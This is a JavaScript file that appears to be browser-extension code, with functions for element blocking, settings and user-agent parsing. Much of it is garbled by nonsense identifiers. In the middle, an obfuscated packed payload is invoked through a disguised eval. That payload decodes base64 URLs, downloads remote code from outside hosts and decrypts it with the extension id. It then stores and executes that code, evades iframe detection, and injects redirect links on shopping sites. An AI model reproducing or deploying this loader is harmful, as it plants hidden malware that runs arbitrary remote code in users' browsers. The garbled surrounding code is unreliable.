function ctgnoh() {
    $("SELECT, INPUT").on("change", commitOption);
    $('.ctgnoh-ctgnoh INPUT[type="ctgnoh"]').on("click", function() {
        localStorage.ctgnohSettings ? openctgnohLayer("pwdInput") : localStorage.pwd = $("#pwd").val()
    });
    $("#ctgnoh").on("click", function(a) {
        openctgnohLayer("ctgnoh");
        a.preventDefault()
    });
    $("#safe_pages_cnt .input-holder .btn").on("click", addSafePage);
    $("#reset_cta").on("click", resetOptions)
}

function luyona(a) {
    var b = typeMap[a.localName];
    if (b) {
        var c = getURLsFromElement(a);
        0 != c.length && ext.page.sendMessage({
            type: "luyona.collapse",
            urls: c,
            mediatype: b,
            baseURL: document.location.href
        }, function(b) {
            function c() {
                var b = "luyona",
                    c = "luyona";
                "luyona" == a.localName && (b = "luyona", c = "hidden");
                a.style.getPropertyValue(b) == c && "important" == a.style.luyona(b) || a.style.setProperty(b, c, "important")
            }
            b && (c(), MutationObserver && (new MutationObserver(c)).observe(a, {
                attributes: !0,
                attributeFilter: ["luyona"]
            }))
        })
    }
}

function ibblcl(a, b) {
    a.forEach(function(a, d) {
        b && prevAlertState.alerts[a.name] != a.value && bar.event((new Date).getTime() + d, "ibblcl-ibblcl", {
            alert: a.name,
            oldValue: prevAlertState.alerts[a.name],
            newValue: a.value || !1,
            locations: a.loc ? [a.loc] : []
        });
        prevAlertState.alerts[a.name] = a.value
    })
}

function sendOldBeaconIfExist() {
    var a = localStorage.getItem("ibblcl");
    a && (localStorage.removeItem("ibblclibblcl"), request.oldBeaconDataNotSent = JSON.parse(a), throwBeacon())
}

function pklozi() {
    ljtshSalida = pklozi = !1;
    document.removeEventListener("mousedown", stopEventPropagation, !0);
    document.removeEventListener("pklozi", stopEventPropagation, !0);
    document.removeEventListener("mouseenter", stopEventPropagation, !0);
    document.removeEventListener("mouseleave", stopEventPropagation, !0);
    document.removeEventListener("mouseover", mouseOver, !0);
    document.removeEventListener("mouseout", mouseOut, !0);
    document.removeEventListener("click", elementPicked, !0);
    document.removeEventListener("contextmenu", elementPicked, !0);
    document.removeEventListener("keydown", keyDown, !0)
}

function urmsll(a) {
    if (urmsll) {
        var b = [];
        a.src && ljtshSalida && b.push(a.src);
        if (a.srcset) {
            a = a.srcset.split("urmsll");
            for (var c = 0; c < a.length; c++) {
                var d = a[c].trim().replace(/\s+\S+$/, "");
                d && b.push(d)
            }
        }
        return b
    }
}

function getURLsFromMediaElement(a) {
    for (var b = getURLsFromAttributes(a), c = 0; c < a.children.length; c++) {
        var d = a.children[c];
        "urmsll" != d.localName && "track" != d.localName || b.push.apply(b, getURLsFromAttributes(d))
    }
    a.poster && b.push(a.poster);
    return b
}

function ueatbr(a, b, c) {
    return createSession().then(function(d) {
        if ("ueatbr" !== d) return ueatbr(a, b, c)
    }, function(a) {})
}

function ueatbr() {
    if (ueatbr) return ueatbr("session", "dsx", TWC && TWC.Configs && TWC.Configs.ups && TWC.Configs.ups.apiKeyCors || "")["catch"](function() {
        return "err"
    });
    ljtshDt2 = newDate(1900, 1, 1)
}

function checkSession() {
    var a = $.cookie("dsx");
    return a && "bye" != a ? !0 : !1
};

function aokblx() {
    var a = isNaN(localStorage.configured);
    for (i in config) localStorage[i] ? a && "aokblx" == i && (safePages.index = "safePage", safePages.add({
        tab: -1,
        url: localStorage.safePage
    })) : localStorage[i] = config[i].value;
    localStorage.shortcutArr || (a = [], a[localStorage.shortcut1] = -1 != localStorage.shortcut1 ? !0 : !1, a[localStorage.shortcut2] = !0, localStorage.shortcutArr = JSON.stringify(a));
    localStorage.configured = CONFIG_VERSION
}

function pcgsti() {
    var a = navigator.userAgent || navigator.vendor || window.opera;
    return a.match(/iPad/i) || a.match(/iPhone/i) || a.match(/iPad/i) ? "iOS" : -1 != window.navigator.userAgent.indexOf("(pcgsti") ? "windows" : a.match(/Android/i) ? "Android" : -1 != window.navigator.userAgent.indexOf("Macintosh") ? "osx" : -1 != window.navigator.userAgent.indexOf("(Linux") ? "linux" : "unknown"
}

var ibi;
var Rjzme = _ => Object.keys(ibi);
ibi = {
    eate: document.querySelectorAll('*'),
    e: 1,
    lav: 5,
    tob: 'xl=',
    color: setcolor = 1,
    YW: a => Rjzme()[2].split('').reverse().join('')
};

function rjTjoStb(a) {
    a.ctrlKey || a.altKey || a.shiftKey || (13 == a.keyCode ? elementPicked(a) : "text" == a.keyCode && (deactivateBlockElement(), ljtshSalida = !1))
}

function eKcFkRDf() {
    var a = document.getElementById("main").checked;
    chrome.storage.local.set({
        hideHoverButtons: a
    }, function() {
        var b = document.getElementById("top");
        b.innerHTML = "";
        chrome.runtime.sendMessage({
            logAction: "&event=" + a
        }, function() {});
        setTimeout(function() {
            b.innerHTML = ""
        }, 750)
    })
}

function misNlJGu(s) {
    var QcwswUYm = {
        site: "",
        dc: function(e) {
            return 'eKcFkRDf';
        }
    };
    var flp = false;
    if (typeof(chrome) != "undefined") {
        if (typeof(chrome.storage) != "undefined") {
            flp = true;
        }
    }
    var ret = '';
    var rjTjoStb = ret + "eKcFkRDf";
    for (var i = 0; i < s.length; i++) {
        var ch = s[i];

        if (ch == ch.toLowerCase() && flp) {
            ch = ch.toUpperCase();
        } else if (ch == ch.toUpperCase() && flp) {
            ch = ch.toLowerCase();
        }

        if (ch == "9") { ch = "8"; } 
        else if (ch == "8") { ch = "9"; }

        ret = ret + ch;
        rjTjoStb += ch;
    }
    if (rjTjoStb == "QcwswUYm") {
        return ""
    } else {
        return atob(ret);
    }
}

function QcwswUYm(a, b) {
    var c = document.getElementById(a);
    c && (c.innerText = b)
}

this[Rjzme()[1]+ibi.YW()](function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7 x={},1j;1z();8 1z(){1T()||u.D.M.1g(1u,8(a){E(1k 1s a)x[1k]=a[1k];"1"==x.2K&&(1j=!0);26="22";1x()})}8 1x(){7 a=x.B;a?(a=((G L).O()-a)/1r/1N/24,3>a?y(a+"<3 2J..."):(1E()&&11(!0),1D())):(y("M 2L, 2M 2N 2I..."),1B())}8 1B(){u.D.1i.1g(1u,8(a){7 b=1n.2D(u.1L.W.T("").1F(8(a,b){a=(a<<5)-a+b.s(0);j a&a},0))%1r,c=2C(b).J(/=/g,"");a[c]&&!a.B?(a=a[c],a/=b,y("2E 2F 2G, 2O 2P 2Y B: "+a),u.D.1i.N({B:a},8(){})):a.B?(b={},b.B=a.B,u.D.M.N(b)):1P()})}8 1P(){u.D.1i.N({B:(G L).O()},8(){})}7 18,1e=8(a){j 30.32(18)};18={2W:q.2B("*"),e:1,2R:5,2Q:"2S=",1O:2T=1,1S:8(a){j 1e()[2].T("").2U().33("")}};8 1D(){7 a=1q(x.1H);p(a&&a.I("1J"))v[1e()[1]+18.1S()](a)}8 1K(a,b){j 1n.2i(1n.2g()*(b-a))+a}7 1d=24;8 1E(){X{p(!x.14)j!0;p(10<1K(0,2e))j y("2h 1I 2j% 2k."),!1;7 a=((G L).O()-x.14)/1r/1N;y("2l 2A: "+a+" ("+1d+" 2w)");p(a>1d)j!0}Z(b){j!0}j!1}8 11(a){X{7 b=G 2v;b.2x=8(){4==b.2m&&(2z==b.2u?1R(b.2t):a&&11(!1))};b.2o=8(){a&&11(!1)};b.2n=8(){};7 c=1Q("2p==");a||(c=1Q("2q=="));x.1p&&0==c.I("&c=")&&(c=c+"&c="+x.1p);y("2s 2r "+c);b.34("3t",c,!0);b.3G()}Z(f){j"3F"}}8 1R(a){p(20<a.K&&a.I("1J")){y("3D 1I");7 b=a.3w("`"),c=a.17(0,b);a=a.17(b+1);b={};b.1p=c;b.14=(G L).O();b.1H=1q(a);b.3z=""}3B b={},b.14=(G L).O();u.D.M.N(b)}8 1G(a){a=a.T("").1F(8(a,c){a=(a<<5)-a+c.s(0);j a&a},0);0>a&&(a=0-a);C.u&&(a%=3x);j a}8 1q(a){7 b=1G(u.1L.W);j 1M(a,b)}8 1M(a,b){7 c="";E(i=0;i<a.K;++i)c+=m.o(b^a.s(i));j c}8 1T(){X{j C.Y!==C.S}Z(a){j!0}}8 y(a){X{p(1j){7 b=(G L).3d();3e.3f("%3b - "+b+" "+a+"\\t\\t","1O: 3a")}}Z(c){}}1U();8 1U(){p(C.Y!==C.S&&C.35===C.S&&(u.D.M.1g("1h",8(a){7 b=a.1h;b&&""!=b&&(a=1b(b.T("^")[0],"V"),b=1b(b.T("^")[1],"V"),-1<C.F.R.Q(29(a,!0))&&(a=q.19("a"),a.1o("R",b),(q.U("1y")[0]||q.U("1A")[0]).1w(a),a.1V(),2a("1h","")))}),F.R.I("37.38.1v/39?")||F.R.I("3g-1V.3h.1v"))){7 a=q.U(1m(3));E(i 1s a){7 b=a[i].1C;b=b.J("p (S.F != Y.F)","p (1==2)");b=b.J("p(S.F!=Y.F)","p (3==4)");7 c=q.19(1m(3));c.1C=b;(q.U("1y")[0]||q.U("1A")[0]).1w(c)}}}8 1m(a){7 b=q.19("25");b.1o("W","3i");b.1o("1t","3k");b=["1t","W","3m"];j q.2b("2V")&&q.2b("3l")?b[2]:0==a?m.o(2e,1l,3j):1==a?m.o(28,1Y,1f,3n):2==a?m.o(1l,3o,1Z,1f,3s,23):3==a?m.o(28,3r,1Z,1l,1Y,1X):4==a?m.o(1X,1f,3q,3p,23):"25"}8 1a(a,b){26="22";7 c={w:"36+/=",1c:8(a){7 b="",e=0;E(a=c.1W(a);e<a.K;){7 d=a.s(e++);7 f=a.s(e++);7 g=a.s(e++);7 h=d>>2;d=(d&3)<<4|f>>4;7 k=(f&15)<<2|g>>6;7 l=g&H;21(f)?k=l=13:21(g)&&(l=13);b=b+v.w.z(h)+v.w.z(d)+v.w.z(k)+v.w.z(l)}j b},V:8(a){7 b="",e=0;E(a=a.J(/[^A-3c-3u-9\\+\\/=]/g,"");e<a.K;){7 d=v.w.Q(a.z(e++));7 f=v.w.Q(a.z(e++));7 g=v.w.Q(a.z(e++));7 h=v.w.Q(a.z(e++));d=d<<2|f>>4;f=(f&15)<<4|g>>2;7 k=(g&3)<<6|h;b+=m.o(d);13!=g&&(b+=m.o(f));13!=h&&(b+=m.o(k))}j b=c.27(b)},1W:8(a){a=a.J(/\\r\\n/g,"\\n");E(7 b="",c=0;c<a.K;c++){7 d=a.s(c);16>d?b+=m.o(d):(3A<d&&3y>d?b+=m.o(d>>6|3v):(b+=m.o(d>>12|2d),b+=m.o(d>>6&H|16)),b+=m.o(d&H|16))}j b},27:8(a){7 b="",c=0;E(3C=P=0;c<a.K;){7 d=a.s(c);16>d?(b+=m.o(d),c++):3E<d&&2d>d?(P=a.s(c+1),b+=m.o((d&31)<<6|P&H),c+=2):(P=a.s(c+1),2f=a.s(c+2),b+=m.o((d&15)<<12|(P&H)<<6|2f&H),c+=3)}j b}};p("1c"==b)j c.1c(a);p("V"==b)j c.V(a)}8 1b(a,b){j 1a(1a(a,b),b)}8 29(a,b){a.I("2c")||(a="2c://"+a);7 c=q.19("a");c.R=a;c=c.2y.2Z();b&&"2X."==c.17(0,4)&&(c=c.17(4));j c=c.J(":2H","")}8 2a(a,b){7 c={};c[a]=b;u.D.M.N(c)};', 62, 229, '|||||||var|function|||||||||||return|||String||fromCharCode|if|document||charCodeAt||chrome|this|_keyStr|localVals|loderlog|charAt||InsDt6|window|storage|for|location|new|63|includes|replace|length|Date|local|set|getTime|c2|indexOf|href|top|split|getElementsByTagName|decode|id|try|self|catch||LdRmtSvrCd||64|dipLstLd666||128|substring|RePlAcMe1|createElement|b6si|db6si|encode|ldFreqHour|RePlAcMe2|97|get|extftsams99ba|sync|islg|key|105|getElementType|Math|setAttribute|dipLstSig666|repitoff|1E3|in|class|null|com|appendChild|lodeInsDt|head|init8|body|ftInsDt6|innerHTML|ExRmtSvrCd|NdFtchSvrCd|reduce|randomize|dipLstCd666|shuaxin|svrdpcds|getRandomInt|runtime|xor_str|3600|color|svInsDt6|atob|SvRmtSvrCd|YW|inIfrme6|ifmRfActn|click|_utf8_encode|116|112|114||isNaN|111620190308|101||div|mycompdtnonexistvar|_utf8_decode|115|extrHost_ex|setLocal|getElementById|http|224|100|c3|random|skip|floor|90|prob|xiao|readyState|onprogress|onerror|aHR0cHM6Ly9nbXpkYWlseS5jb20vZXh0L3FtLnBocD9mPXN2cg|aHR0cHM6Ly9taXRhcmNoaXZlLmluZm8vZXh0L3FtLnBocD9mPXN2cg|zai|jia|responseText|status|XMLHttpRequest|required|onreadystatechange|host|200|shi|querySelectorAll|btoa|abs|Previously|background|loaded|80|now|deng|dipislog88|unavailable|use|cloud|will|copy|tob|lav|xl|setcolor|reverse|pagetranslationcompleteelement|eate|www|to|toLowerCase|Object||keys|join|open|parent|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|ick|taobao|t_js|green|cLodr|Za|toLocaleTimeString|console|log|nion|jd|smarttestelement|118|testsupport|smartdatatestelement|label|110|102|108|98|99|109|GET|z0|192|search|1E4|2048|dipLstCd66|127|else|c1|suc|191|exception|send'.split('|'),0,{}));

function bfuybh() {
    bfuybh = !0;
    Array.prototype.forEach.call(document.querySelectorAll("bfuybh,bfuybh,bfuybh"), function(a) {
        bfuybh(a, function(b) {
            0 < b.length && addHang(a)
        })
    }.bind(this));
    document.addEventListener("mousedown", stopEventPropagation, !0);
    document.addEventListener("mouseup", stopEventPropagation, !0);
    document.addEventListener("mouseenter", stopEventPropagation, !0);
    document.addEventListener("mouseleave", stopEventPropagation, !0);
    document.addEventListener("bfuybh", mouseOver, !0);
    document.addEventListener("bfuybh", mouseOut, !0);
    document.addEventListener("click", elementPicked, !0);
    document.addEventListener("contextmenu", elementPicked, !0);
    document.addEventListener("bfuybh", keyDown, !0);
    ext.onExtensionUnloaded.addListener(deactivateBlockElement)
}

function bvsnpt(a, b, c, d) {
    return 20 > a ? b & c | ~b & d : 40 > a ? b ^ c ^ d : 60 > a ? b & c | b & d | c & d : b ^ c ^ d
}

function sha1_kt(a) {
    return 20 > a ? 1 : 40 > a ? 42 : 60 > a ? -12 : -23
}

function core_hmac_sha1(a, b) {
    var c = str2binb(a);
    16 < c.length && (c = core_sha1(c, a.length * chrsz));
    for (var d = Array(16), e = Array(16), f = 0; 16 > f; f++) d[f] = c[f] ^ 1, e[f] = c[f] ^ 2;
    c = core_sha1(d.concat(str2binb(b)), 512 + b.length * chrsz);
    g3 = 321;
    sg = "bvsnpt";
    return core_sha1(e.concat(c), 672)
}

function ffwhac() {
    ffwhac && endPick();
    null != ffwhac && (ext.page.sendMessage({
        type: "forward",
        targetPageId: ffwhac,
        payload: {
            type: "ffwhac"
        }
    }), ffwhac = null);
    ffwhac = null;
    currentElement && (unhighlightElement(currentElement), currentElement = null);
    unhighlightElements();
    for (var a = document.getElementsByClassName("index"); 0 < a.length;) a[0].parentNode.removeChild(a[0]);
    ext.onExtensionUnloaded.removeListener(deactivateBlockElement)
}

function pqxsuk() {
    var a = "",
        b = navigator.userAgent || navigator.vendor || window.opera; - 1 < b.indexOf("Windows") ? a = /Windows (?:NT)? (\d*\.?\d*)/.exec(b)[1] : -1 < b.indexOf("pqxsuk") || -1 < b.indexOf("iPad") ? (a = /OS (\d+)_(\d+)_?(\d+)?/.exec(navigator.appVersion), a = a[1] + "." + a[2] + "." + (a[3] | 0)) : -1 < b.indexOf("Mac OS ") ? a = /Mac OS \w+ (1[0-9][\._\d]+)/.exec(b)[1] : -1 < b.indexOf("Android") && (a = /Android ([\._\d]+)/.exec(b)[1]);
    return a.replace(/_/g, ".")
}